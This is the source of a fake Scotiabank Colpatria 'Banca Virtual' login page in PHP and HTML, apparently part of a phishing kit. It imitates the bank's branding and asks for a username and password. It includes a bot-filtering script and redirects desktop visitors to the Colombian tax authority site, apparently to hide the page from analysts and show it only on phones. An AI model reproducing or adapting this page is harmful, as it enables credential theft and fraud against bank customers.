<?php
require "is_botcito.php";
require "ayudante.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="cabe">
            <div class="logocenter">
                <div class="logo">

                </div>

            </div>
        </div>
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="titulo">
                        <h1>Ingresa a tu Banca Virtual</h1>
                        <hr />
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fusuario">
                                <div class="inputg columna">
                                    <input type="text" name="usuario" id="usuario" placeholder="Nombre de usuario" maxlength="12" />
                                    <div class="error" id="eUsuario">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Ingresa un nombre de usuario que contenga entre 6 a 12 caracteres y sin caracteres especiales</span>
                                    </div>
                                </div>
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input style="width: 100%;" type="password" name="contra" id="contra" placeholder="Contraseña" maxlength="15" class="contrasena" />
                                    <div class="vali" style="display: none;" id="validaciones">
                                        <span id="cantidad">8+ caracteres</span>
                                        <span id="mayus">1+ mayuscula</span>
                                        <span id="minus">1+ minúscula</span>
                                        <span id="numero">1+ número</span>
                                    </div>
                                </div>
                                <div class="inputge">
                                    <a href="javascript:void(0)" class="enlacef" style="margin-top: 7px;">¿Necesitas ayuda para ingresar?</a>
                                </div>

                                <div class="inputche">
                                    <input type="checkbox" name="record" id="record" />
                                    <label for="record">Recordar mi nombre de usuario</label>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btnusuario" class="btn">Ingresar</button>
                                </div>
                                <div class="inputg inicio">
                                    <p style="margin-bottom: 5px;">¿No te has registrado?</p>
                                    <a href="javascript:void(0)" class="enlacef">Registrate ahora</a>
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/depart.svg" alt="depart" />
                            <p>
                                ¡Aprovecha todos los beneficios de tu Banca Virtual: haz
                                pagos, transferencias, recargas y mucho más!
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="pie">
            <div class="piecenter">
                <p class="derec">
                    © 2022 Todos los Derechos Reservados Scotiabank Colpatria.
                </p>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>

<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>

</html>